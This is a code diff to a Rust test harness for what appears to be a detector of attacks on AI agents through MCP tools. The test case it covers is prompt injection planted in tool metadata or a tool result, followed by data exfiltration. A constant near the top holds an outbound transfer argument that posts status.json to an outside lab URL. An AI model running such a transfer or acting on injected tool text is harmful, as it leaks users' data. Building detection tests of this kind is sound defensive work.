@@ -522,6 +522,9 @@ type Uc001SourceCase = (
     &'static str,
 );
 
+/// The zero-point rule a reference to the controlled domain raises.
+const UC001_MENTION: &str = "network.controlled_test_domain.mention";
+
 /// The outbound transfer each UC-001 positive runs after the injected text.
 const UC001_TRANSFER: &str = "--data-binary @status.json https://darkroastcyber.io/mcp-lab";
 
@@ -631,12 +634,16 @@ fn check_uc001_source_coverage(cases: &[Uc001SourceCase], root: &Path) -> Result
             "UC-001 exact identity coverage: expected {expected:?}, represented {represented:?}"
         ));
     }
-    let rules = compile_rule_v1(
-        &telltale_rules::load_default_rule_set()
-            .map_err(|error| error.to_string())?
-            .compatibility_export(),
-    )
-    .map_err(|error| error.to_string())?;
+    let export = telltale_rules::load_default_rule_set()
+        .map_err(|error| error.to_string())?
+        .compatibility_export();
+    let rules = compile_rule_v1(&export).map_err(|error| error.to_string())?;
+    let exfiltration = export
+        .rules()
+        .iter()
+        .filter(|rule| rule.category == "exfiltration")
+        .map(|rule| rule.id.as_str())
+        .collect::<BTreeSet<_>>();
     let temp = tempfile::tempdir().map_err(|error| error.to_string())?;
     let uc001_rules = [
         "mcp.tool_metadata.prompt_injection",
@@ -750,7 +757,9 @@ fn check_uc001_source_coverage(cases: &[Uc001SourceCase], root: &Path) -> Result
                 {
                     return Err(format!("{context}: expected Copilot UC-001 visibility gap"));
                 }
-                for rule in &uc001_rules[..2] {
+                // The rules that read the injected tool result need message
+                // capture, which this source does not report.
+                for rule in &[uc001_rules[0], UC001_MENTION] {
                     let detector = sessions[0]
                         .detectors()
                         .iter()
@@ -814,14 +823,17 @@ fn check_uc001_source_coverage(cases: &[Uc001SourceCase], root: &Path) -> Result
                 if mention_only.len() == observations.len()
                     || attack.session_id().is_none()
                     || !twin_attack.is_some_and(|session| {
-                        uc001_rules[..2]
+                        let ids = session.rule_ids();
+                        [uc001_rules[0], UC001_MENTION]
                             .iter()
-                            .all(|rule| session.rule_ids().iter().any(|id| id == rule))
-                            && !session.rule_ids().iter().any(|id| id == uc001_rules[2])
+                            .all(|rule| ids.iter().any(|id| id == rule))
+                            && !ids.iter().any(|id| {
+                                id == uc001_rules[2] || exfiltration.contains(id.as_str())
+                            })
                     })
                 {
                     return Err(format!(
-                        "{context}: a URL named only in text must keep both findings and link no chain; got {:?}",
+                        "{context}: a URL named only in text must raise the injection and the reference, no exfiltration finding and no chain; got {:?}",
                         twin.sessions()
                             .iter()
                             .map(|session| (session.rule_score(), session.rule_ids()))
